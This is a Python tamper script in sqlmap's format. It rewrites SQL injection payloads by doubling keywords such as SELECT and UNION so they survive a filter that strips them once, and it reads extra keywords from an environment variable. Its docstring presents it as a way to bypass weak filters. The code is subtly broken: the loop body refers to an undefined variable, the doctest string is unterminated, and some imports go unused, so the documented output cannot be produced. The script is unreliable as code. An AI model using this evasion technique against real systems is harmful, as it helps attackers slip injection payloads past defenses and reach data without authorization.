#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from re import finditer, search
from os import environ
from math import ceil, floor
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Transforms keywords ('SELECT') so they are valid when stripped once ('SELSELECTECT')

    Keywords can be set with 'UNSTRIP_KEYWORDS' environment variable:
        $ export UNSTRIP_KEYWORDS=select,union

    Tested against:
        * MySQL 5.7

    Notes:
        * Useful to bypass weak filters based on keywords stripping.

    >>> tamper('SELECT id FROM users UNION SELECT NULL')
    'SELSELECTECT id FROM users UNUNIONION SELSELECTECT NULL
    """

    retVal = payload
    keywords = ['SELECT', 'UNION', 'WHERE', 'SUBSTR'];

    if 'UNSTRIP_KEYWORDS' in environ:
        keywords = environ['UNSTRIP_KEYWORDS'].upper().split(',')

    if payload:
        for keyword in keywords:
            if keyword in payload and search(r"(?i)[`\"'\[]%s[`\"'\]]" % word, retVal) is None:
                retVal = retVal.replace(word, word[:int(floor(len(word)/2))] + word + word[int(ceil(len(word)/2)):])

    return retVal
